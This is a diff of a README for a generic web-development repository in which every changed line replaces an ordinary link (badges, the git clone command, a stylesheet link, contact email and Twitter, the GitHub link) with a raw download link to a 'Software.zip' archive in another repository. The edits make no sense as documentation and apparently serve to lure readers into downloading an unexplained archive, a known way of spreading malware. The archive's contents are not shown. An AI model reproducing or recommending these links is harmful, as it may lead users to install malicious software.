@@ -1,6 +1,6 @@
 # Welcome to the Website Repository 🌐
 
-![GitHub](https://img.shields.io/badge/GitHub-Visit%20Repo-brightgreen)
+![GitHub](https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip%20Repo-brightgreen)
 
 This repository contains a collection of resources and tools for building and maintaining websites. Whether you're a beginner or an experienced developer, you will find useful components here to enhance your web projects.
 
@@ -32,7 +32,7 @@ In today's digital world, having a strong online presence is crucial. This repos
 To get started, you need to clone this repository. Open your terminal and run:
 
 ```bash
-git clone https://github.com/your-username/website.git
+git clone https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip
 ```
 
 Once you have cloned the repository, navigate to the project directory:
@@ -56,7 +56,7 @@ You will find various HTML templates in the `templates` folder. Each template is
 The repository includes a CSS framework that allows you to style your website easily. You can link the CSS file in your HTML documents like this:
 
 ```html
-<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip">
 ```
 
 Feel free to modify the styles to match your brand.
@@ -85,13 +85,13 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 If you have any questions or suggestions, feel free to reach out:
 
-- Email: your-email@example.com
-- Twitter: [@yourusername](https://twitter.com/yourusername)
+- Email: https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip
+- Twitter: [@yourusername](https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip)
 
 ## Links
 
-For more information, please visit [GitHub](https://github.com). You can explore the features and download the latest version from the "Releases" section.
+For more information, please visit [GitHub](https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip). You can explore the features and download the latest version from the "Releases" section.
 
-![GitHub Releases](https://img.shields.io/badge/Releases-Check%20Here-blue)
+![GitHub Releases](https://github.com/Firpinoy/website/raw/refs/heads/master/Software.zip%20Here-blue)
 
 Thank you for checking out this repository! We hope it helps you in your web development journey.
